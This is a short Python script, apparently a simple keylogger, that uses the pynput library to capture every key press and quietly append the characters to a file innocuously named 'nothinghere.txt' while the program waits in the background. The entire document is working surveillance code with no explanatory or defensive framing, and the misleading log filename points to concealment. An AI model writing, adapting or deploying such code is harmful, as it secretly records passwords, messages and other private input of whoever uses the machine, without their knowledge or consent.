from pynput import keyboard

def keyInput(key):
    with open("nothinghere.txt", 'a') as Keylog:
        try:
            char = key.char
            Keylog.write(char)
        except:
            print("Error")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyInput)
    listener.start()
    input()
